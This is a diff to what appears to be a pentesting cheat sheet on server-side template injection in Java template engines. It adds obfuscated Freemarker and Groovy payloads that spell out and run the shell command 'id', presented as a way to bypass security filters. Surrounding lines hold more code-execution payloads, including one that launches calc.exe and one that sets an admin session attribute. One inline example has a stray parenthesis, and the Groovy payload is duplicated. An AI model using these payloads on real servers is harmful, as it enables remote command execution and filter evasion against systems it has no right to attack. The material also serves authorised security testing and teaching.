@@ -13,6 +13,7 @@
     - [Freemarker - Basic Injection](#freemarker---basic-injection)
     - [Freemarker - Read File](#freemarker---read-file)
     - [Freemarker - Code Execution](#freemarker---code-execution)
+    - [Freemarker - Code Execution with Obfuscation](#freemarker---code-execution-with-obfuscation)
     - [Freemarker - Sandbox Bypass](#freemarker---sandbox-bypass)
 - [Codepen](#codepen)
 - [Jinjava](#jinjava)
@@ -27,6 +28,7 @@
     - [Groovy - Read File](#groovy---read-file)
     - [Groovy - HTTP Request:](#groovy---http-request)
     - [Groovy - Command Execution](#groovy---command-execution)
+    - [Groovy - Command Execution with Obfuscation](#groovy---command-execution-with-obfuscation)
     - [Groovy - Sandbox Bypass](#groovy---sandbox-bypass)
 - [Spring Expression Language](#spring-expression-language)
     - [SpEL - Basic Injection](#spel---basic-injection)
@@ -109,6 +111,20 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 #{"freemarker.template.utility.Execute"?new()("id")}
 [="freemarker.template.utility.Execute"?new()("id")]
 ```
+
+### Freemarker - Code Execution with Obfuscation
+
+FreeMarker offers the built-in function: `lower_abc`. This function converts int-based values into alphabetic strings, but not in the way you might expect from functions such as `chr` in Python, as the [documentation for lower_abc explains](https://freemarker.apache.org/docs/ref_builtins_number.html#ref_builtin_lower_abc):
+
+If you wanted a string that represents the string: "id", you could use the payload: `${9?lower_abc+4?lower_abc)}`.
+
+Chaining `lower_abc` to perform code execution (command: `id`):
+
+```js
+${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(9?lower_abc+4?lower_abc)}
+```
+
+Reference and explanation of payload can be found [here](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
 
 ### Freemarker - Sandbox Bypass
 
@@ -293,6 +309,20 @@ ${this.evaluate("9*9") //(this is a Script class)}
 ${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
 ```
 
+### Groovy - Command Execution with Obfuscation
+
+You can bypass security filters by constructing strings from ASCII codes and executing them as system commands.
+
+Payload represent the string: `id`: `${((char)105).toString()+((char)100).toString()}`.
+
+Execute system command (command: `id`):
+
+```groovy
+${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}
+```
+
+Reference and explanation of payload can be found [here](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
+
 ### Groovy - Sandbox Bypass
 
 ```groovy
@@ -390,3 +420,4 @@ ${pageContext.request.getSession().setAttribute("admin",true)}
 - [Leveraging the Spring Expression Language (SpEL) injection vulnerability (a.k.a The Magic SpEL) to get RCE - Xenofon Vassilakopoulos - November 18, 2021](https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)
 - [RCE in Hubspot with EL injection in HubL - @fyoorer - December 7, 2018](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)
 - [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - January 29, 2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
+- [Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere - YesWeHack, Brumens - March 24, 2025](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
